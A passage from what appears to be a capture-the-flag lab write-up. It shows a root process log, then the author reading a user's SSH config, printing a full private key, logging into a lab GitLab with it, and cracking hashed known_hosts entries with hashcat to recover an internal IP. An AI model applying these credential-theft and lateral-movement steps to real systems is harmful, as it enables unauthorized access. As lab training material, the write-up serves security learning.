2026/04/15 10:03:16 CMD: UID=0     PID=40817  | /bin/sh /etc/update-motd.d/00-header 
2026/04/15 10:03:16 CMD: UID=0     PID=40818  | 
2026/04/15 10:03:16 CMD: UID=0     PID=40819  | /bin/sh /etc/update-motd.d/50-motd-news 
2026/04/15 10:03:16 CMD: UID=0     PID=40820  | run-parts --lsbsysinit /etc/update-motd.d 
2026/04/15 10:03:16 CMD: UID=0     PID=40821  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:03:16 CMD: UID=0     PID=40822  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:03:16 CMD: UID=0     PID=40823  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:03:16 CMD: UID=0     PID=40824  | cut -d  -f4 
2026/04/15 10:03:16 CMD: UID=0     PID=40825  | id -u 
2026/04/15 10:03:16 CMD: UID=0     PID=40826  | 
2026/04/15 10:03:16 CMD: UID=0     PID=40827  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd 
2026/04/15 10:03:16 CMD: UID=0     PID=40828  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd 
2026/04/15 10:03:16 CMD: UID=0     PID=40829  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd 
2026/04/15 10:03:16 CMD: UID=0     PID=40830  | sshd: ghoul [priv]   
2026/04/15 10:03:16 CMD: UID=1004  PID=40831  | 
2026/04/15 10:03:16 CMD: UID=0     PID=40833  | 
2026/04/15 10:03:16 CMD: UID=0     PID=40832  | 
2026/04/15 10:03:26 CMD: UID=0     PID=40834  | /sbin/init 
2026/04/15 10:06:15 CMD: UID=0     PID=40837  | 
2026/04/15 10:06:15 CMD: UID=0     PID=40838  | sshd: [accepted]     
2026/04/15 10:06:16 CMD: UID=0     PID=40839  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40840  | /sbin/init 
2026/04/15 10:06:16 CMD: UID=1004  PID=40841  | (sd-pam) 
2026/04/15 10:06:16 CMD: UID=1004  PID=40842  | (sd-executor)               
2026/04/15 10:06:16 CMD: UID=1004  PID=40843  | 
2026/04/15 10:06:16 CMD: UID=1004  PID=40844  | (sd-executor)               
2026/04/15 10:06:16 CMD: UID=1004  PID=40845  | (direxec)                   
2026/04/15 10:06:16 CMD: UID=0     PID=40846  | 
2026/04/15 10:06:16 CMD: UID=1004  PID=40847  | (ystemctl)                  
2026/04/15 10:06:16 CMD: UID=0     PID=40848  | sshd: ghoul [priv]   
2026/04/15 10:06:16 CMD: UID=0     PID=40849  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d 
2026/04/15 10:06:16 CMD: UID=0     PID=40850  | run-parts --lsbsysinit /etc/update-motd.d 
2026/04/15 10:06:16 CMD: UID=0     PID=40851  | /bin/sh /etc/update-motd.d/00-header 
2026/04/15 10:06:16 CMD: UID=0     PID=40852  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40853  | /bin/sh /etc/update-motd.d/00-header 
2026/04/15 10:06:16 CMD: UID=0     PID=40854  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40855  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40856  | run-parts --lsbsysinit /etc/update-motd.d 
2026/04/15 10:06:16 CMD: UID=0     PID=40857  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:06:16 CMD: UID=0     PID=40858  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:06:16 CMD: UID=0     PID=40860  | cut -d  -f4 
2026/04/15 10:06:16 CMD: UID=0     PID=40861  | /bin/sh /etc/update-motd.d/91-release-upgrade 
2026/04/15 10:06:16 CMD: UID=0     PID=40862  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40863  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40864  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd 
2026/04/15 10:06:16 CMD: UID=0     PID=40865  | cat /var/lib/ubuntu-release-upgrader/release-upgrade-available 
2026/04/15 10:06:16 CMD: UID=0     PID=40866  | sshd: ghoul [priv]   
2026/04/15 10:06:16 CMD: UID=1004  PID=40867  | 
2026/04/15 10:06:16 CMD: UID=0     PID=40868  | 
2026/04/15 10:06:19 CMD: UID=0     PID=40870  | 
2026/04/15 10:06:26 CMD: UID=0     PID=40871  | (time-dir) 


```

Now the private key for Gizmo is again used by Gitlab as shown before for Katja on FTS01:

```bash
root@mobile01:/home/gizmo/.ssh# cat config 
# BEGIN ANSIBLE MANAGED BLOCK: gitlab.wanderer.htb
Host gitlab.wanderer.htb
  PreferredAuthentications publickey
  IdentityFile ~/.ssh/id_ed25519
# END ANSIBLE MANAGED BLOCK: gitlab.wanderer.htb
root@mobile01:/home/gizmo/.ssh# 
root@mobile01:/home/gizmo/.ssh# cat id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDRn0wLi0igsMBjQiRyvKVei+dFuVRZFew2YYvyh9GVJgAAAJAsIQjGLCEI
xgAAAAtzc2gtZWQyNTUxOQAAACDRn0wLi0igsMBjQiRyvKVei+dFuVRZFew2YYvyh9GVJg
AAAEA9sGtZ6QtJMNzoewyuTtWzD58Sd21+L0iK9WyV7ypKVtGfTAuLSKCwwGNCJHK8pV6L
50W5VFkV7DZhi/KH0ZUmAAAADWlwcHNlY0BwYXJyb3Q=
-----END OPENSSH PRIVATE KEY-----
root@mobile01:/home/gizmo/.ssh# 

└─$ ssh -i gizmo_gitlab.key git@gitlab.wanderer.htb
PTY allocation request failed on channel 0
Welcome to GitLab, @gizmo!
Connection to gitlab.wanderer.htb closed.
                                            
```

But IZO has this one in his traces:

```bash
root@mobile01:/home/izo/.ssh# cat known_hosts 
|1|dcCV8B/ZKZgnlGKsJ4ya1YWuZGI=|E5dV06IQn9UWdtnHi5yMYGz1DPU= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/KfVO1HT87Y/kPDJ+9emwpl4YAr1/vize6pOO1yyE1
|1|xx43FleXLbBQpmGeGBox2XU+ObA=|y2lAadb5TCx114pCT4XoLgMgcfE= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk5s0dksKTvOZNqHLjGYQGoMKG557DlKZPfv1jcZGoa

```

And a quick google

Knowing the IP this can be appured by doing this one:

```bash
root@mobile01:/home/izo/.ssh# ssh-keygen -F 10.0.3.10 -f /home/izo/.ssh/known_hosts
# Host 10.0.3.10 found: line 1 
|1|dcCV8B/ZKZgnlGKsJ4ya1YWuZGI=|E5dV06IQn9UWdtnHi5yMYGz1DPU= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/KfVO1HT87Y/kPDJ+9emwpl4YAr1/vize6pOO1yyE1

```

A quick googling show traces of [this](https://github.com/chris408/known_hosts-hashcat/tree/master) one, basically the idea is to crack the hashes known hosts file to show what is the IP this user logged into:

```bash
└─$ python2.7 kh-converter.py /home/user/Downloads/Wanderer/known_hosts_izo_mobileapi     
139755d3a2109fd51676d9c78b9c8c606cf50cf5:75c095f01fd92998279462ac278c9ad585ae6462
cb694069d6f94c2c75d78a424f85e82e032071f1:c71e371657972db050a6619e181a31d9753e39b0

```

And now I have the cracked IP:

```bash
hashcat -a 3 -m 160 --quiet --hex-salt known_hosts.hash ipv4_hcmask.txt

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 160 (HMAC-SHA1 (key = $salt))
Hash.Target......: known_hosts.hash
Time.Started.....: Wed Apr 15 13:37:33 2026 (0 secs)
Time.Estimated...: Wed Apr 15 13:37:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Mask.......: ?3?d.25?2.?3?d.2?1?d [13]
Guess.Charset....: -1 01234, -2 012345, -3 123456789, -4 N/A, -5 N/A, -6 N/A, -7 N/A, -8 N/A 
Guess.Queue......: 442/625 (70.72%)
Speed.#01........:   663.1 MH/s (1.14ms) @ Accel:15 Loops:64 Thr:1024 Vec:1
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 4860000/4860000 (100.00%)
Rejected.........: 0/4860000 (0.00%)
Restore.Point....: 27000/27000 (100.00%)
Restore.Sub.#01..: Salt:1 Amplifier:64-90 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: 28.254.12.234 -> 68.253.64.249
Hardware.Mon.#01.: Temp: 66c Util: 96% Core:1635MHz Mem:5000MHz Bus:8

139755d3a2109fd51676d9c78b9c8c606cf50cf5:75c095f01fd92998279462ac278c9ad585ae6462:10.0.3.10

```

I feel confortable now to move on to the new machine.

&nbsp;